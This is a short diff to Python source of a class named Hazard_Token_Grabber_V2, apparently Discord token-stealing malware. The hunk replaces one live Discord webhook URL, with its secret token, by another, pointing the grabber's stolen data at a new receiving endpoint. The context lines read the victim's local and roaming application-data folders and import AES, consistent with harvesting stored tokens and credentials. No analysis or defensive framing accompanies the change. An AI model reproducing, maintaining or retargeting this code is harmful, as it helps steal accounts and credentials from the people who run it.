@@ -14,7 +14,7 @@ from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
     def __init__(self):
-        self.webhook = "https://discord.com/api/webhooks/930979138955776070/2aYPBvuAMqTT5y_f8GpIWc2TJi0wqYncDtSi4_-9NJ-0-gn8__eg7JaM4V9eG9EE7M3y"
+        self.webhook = "https://discord.com/api/webhooks/1433891785029189715/441B_fb0tXyqeBsgk5haRxcJ1LhR7vfDjQYkMCTaC3Wy5Nai5TqrYAFhVnQWLf5vurrw"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
